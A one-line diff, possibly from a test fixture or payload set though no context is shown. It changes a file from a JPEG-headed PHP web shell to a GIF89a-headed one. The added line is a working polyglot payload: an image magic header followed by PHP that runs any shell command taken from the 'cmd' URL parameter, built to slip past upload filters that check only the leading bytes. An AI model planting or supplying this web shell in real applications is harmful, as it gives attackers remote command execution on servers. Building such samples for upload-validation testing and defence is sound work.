@@ -1,1 +1,1 @@
-\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>
+GIF89a<?php system(\$_GET['cmd']); ?>
